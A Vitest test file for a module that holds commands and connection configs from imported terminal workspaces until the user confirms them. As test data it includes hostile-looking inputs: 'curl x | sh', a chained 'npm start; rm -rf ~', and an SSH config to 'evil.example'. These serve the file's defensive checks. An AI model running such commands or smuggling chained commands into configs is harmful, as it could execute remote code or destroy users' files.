import { describe, expect, it } from "vitest";
import type { WorkspaceTabDef, WorkspaceTabGroupDef } from "@/types/workspace";
import {
  canonicalJson,
  collectImportedItems,
  describeImportedConnection,
  formatUntrustedImportNotice,
  importedCommandKey,
  importedConnectionKey,
  importKeyKind,
  isImportConfirmed,
  resolveImportTrust,
  withImportConfirmed,
  withImportsRevoked,
} from "./workspaceImportTrust";

function groupOf(tabs: WorkspaceTabDef[]): WorkspaceTabGroupDef[] {
  return [{ name: "Main", layout: { type: "leaf", tabs } }];
}

function tabsOf(groups: WorkspaceTabGroupDef[]): WorkspaceTabDef[] {
  const layout = groups[0].layout;
  if (layout.type !== "leaf") throw new Error("expected leaf");
  return layout.tabs;
}

describe("workspaceImportTrust (#4434)", () => {
  it("canonicalJson sorts object keys so key order does not change the hash", () => {
    expect(canonicalJson({ b: 1, a: { d: [2, { y: 1, x: 0 }], c: null } })).toBe(
      '{"a":{"c":null,"d":[2,{"x":0,"y":1}]},"b":1}'
    );
  });

  it("keys a command by its exact text", async () => {
    const a = await importedCommandKey("make deploy");
    expect(a).toMatch(/^cmd:[0-9a-f]{64}$/);
    expect(await importedCommandKey("make deploy")).toBe(a);
    expect(await importedCommandKey("make deploy ")).not.toBe(a);
  });

  it("keys an inline config by its content, not its key order", async () => {
    const a = await importedConnectionKey({ type: "local", config: { shell: "zsh", x: 1 } });
    expect(a).toMatch(/^conn:[0-9a-f]{64}$/);
    expect(await importedConnectionKey({ config: { x: 1, shell: "zsh" }, type: "local" })).toBe(a);
    expect(
      await importedConnectionKey({ type: "local", config: { shell: "bash", x: 1 } })
    ).not.toBe(a);
  });

  it("adds a key to the allowlist once", () => {
    expect(isImportConfirmed(undefined, "cmd:x")).toBe(false);
    const once = withImportConfirmed(undefined, "cmd:x");
    expect(once).toEqual(["cmd:x"]);
    expect(withImportConfirmed(once, "cmd:x")).toEqual(["cmd:x"]);
    expect(isImportConfirmed(once, "cmd:x")).toBe(true);
  });

  it("keeps an unconfirmed imported command pending", async () => {
    const groups = groupOf([{ pendingInitialCommand: "curl x | sh" }]);
    const resolved = await resolveImportTrust(groups, []);
    expect(tabsOf(resolved)[0]).toEqual({ pendingInitialCommand: "curl x | sh" });
  });

  it("promotes a confirmed imported command to initialCommand", async () => {
    const key = await importedCommandKey("npm start");
    const groups = groupOf([{ pendingInitialCommand: "npm start", title: "T" }]);
    const resolved = await resolveImportTrust(groups, [key]);
    expect(tabsOf(resolved)[0]).toEqual({ initialCommand: "npm start", title: "T" });
    // The input is not mutated.
    expect(tabsOf(groups)[0].pendingInitialCommand).toBe("npm start");
  });

  it("needs a new confirmation once the command text changes", async () => {
    const key = await importedCommandKey("npm start");
    const resolved = await resolveImportTrust(
      groupOf([{ pendingInitialCommand: "npm start; rm -rf ~" }]),
      [key]
    );
    expect(tabsOf(resolved)[0].initialCommand).toBeUndefined();
    expect(tabsOf(resolved)[0].pendingInitialCommand).toBe("npm start; rm -rf ~");
  });

  it("clears the unconfirmed flag only for a confirmed inline config", async () => {
    const inline = { type: "local", config: { shell: "zsh" } };
    const other = { type: "local", config: { shell: "/tmp/x" } };
    const key = await importedConnectionKey(inline);
    const resolved = await resolveImportTrust(
      groupOf([
        { inlineConfig: inline, inlineConfigUnconfirmed: true },
        { inlineConfig: other, inlineConfigUnconfirmed: true },
      ]),
      [key]
    );
    expect(tabsOf(resolved)[0].inlineConfigUnconfirmed).toBeUndefined();
    expect(tabsOf(resolved)[1].inlineConfigUnconfirmed).toBe(true);
  });

  it("leaves a locally created workspace untouched", async () => {
    const groups = groupOf([
      { initialCommand: "npm start", inlineConfig: { type: "local", config: {} } },
    ]);
    const resolved = await resolveImportTrust(groups, []);
    expect(tabsOf(resolved)[0]).toEqual(tabsOf(groups)[0]);
  });

  it("walks split layouts", async () => {
    const key = await importedCommandKey("ls");
    const resolved = await resolveImportTrust(
      [
        {
          name: "Main",
          layout: {
            type: "split",
            direction: "horizontal",
            children: [
              { type: "leaf", tabs: [{ pendingInitialCommand: "ls" }] },
              { type: "leaf", tabs: [{ pendingInitialCommand: "pwd" }] },
            ],
          },
        },
      ],
      [key]
    );
    const layout = resolved[0].layout;
    if (layout.type !== "split") throw new Error("expected split");
    const [left, right] = layout.children;
    if (left.type !== "leaf" || right.type !== "leaf") throw new Error("expected leaves");
    expect(left.tabs[0].initialCommand).toBe("ls");
    expect(right.tabs[0].pendingInitialCommand).toBe("pwd");
  });

  it("describes an inline config without echoing secrets", () => {
    const ssh = describeImportedConnection({
      type: "ssh",
      config: { host: "evil.example", username: "root", port: 2222, password: "hunter2" },
    });
    expect(ssh).toEqual({
      type: "ssh",
      target: "root@evil.example:2222",
      embeddedCommand: undefined,
      spawnsLocalProcess: false,
    });
    expect(JSON.stringify(ssh)).not.toContain("hunter2");

    expect(
      describeImportedConnection({
        type: "local",
        config: { shell: "/tmp/x", initialCommand: "id" },
      })
    ).toEqual({
      type: "local",
      target: "shell /tmp/x",
      embeddedCommand: "id",
      spawnsLocalProcess: true,
    });
    expect(describeImportedConnection({ type: "some-plugin", config: {} }).spawnsLocalProcess).toBe(
      true
    );
    expect(describeImportedConnection(null).type).toBe("unknown");
  });

  it("formats the import notice with the real command text and connection", () => {
    expect(formatUntrustedImportNotice([])).toBeNull();
    const notice = formatUntrustedImportNotice([
      { workspaceName: "WS", tabTitle: "Build", command: "curl x | sh", spawnsLocalProcess: false },
      {
        workspaceName: "WS",
        connectionType: "local",
        connectionTarget: "shell /tmp/payload",
        embeddedCommand: "id",
        spawnsLocalProcess: true,
      },
    ]);
    expect(notice).toContain("2 imported tabs carry untrusted commands or connections");
    expect(notice).toContain('"Build" in WS: runs "curl x | sh"');
    expect(notice).toContain(
      'WS: opens local shell /tmp/payload, starts a local program; its connection runs "id"'
    );
  });
});

describe("workspaceImportTrust revoke helpers (#4445)", () => {
  it("withImportsRevoked drops only the given keys and keeps order", () => {
    expect(withImportsRevoked(["cmd:a", "conn:b", "cmd:c"], ["cmd:a", "cmd:c"])).toEqual([
      "conn:b",
    ]);
    expect(withImportsRevoked(undefined, ["cmd:a"])).toEqual([]);
    expect(withImportsRevoked(["cmd:a"], [])).toEqual(["cmd:a"]);
  });

  it("importKeyKind reads the key prefix", () => {
    expect(importKeyKind("cmd:abc")).toBe("command");
    expect(importKeyKind("conn:abc")).toBe("connection");
    expect(importKeyKind("other")).toBe("unknown");
  });

  it("collectImportedItems lists held items with keys matching the trust keys", async () => {
    const inline = { type: "ssh", config: { host: "h" } };
    const items = collectImportedItems(
      groupOf([
        { title: "A", pendingInitialCommand: "make" },
        { title: "B", inlineConfig: inline, inlineConfigUnconfirmed: true },
        { title: "Local", initialCommand: "npm start" },
      ])
    );
    expect(items.map((i) => [i.id, i.kind, i.tabLabel, i.text])).toEqual([
      ["0-0-0-cmd", "command", "A (Main)", "make"],
      ["0-0-1-conn", "connection", "B (Main)", "ssh h"],
    ]);
    expect(await items[0].key()).toBe(await importedCommandKey("make"));
    expect(await items[1].key()).toBe(await importedConnectionKey(inline));
  });
});
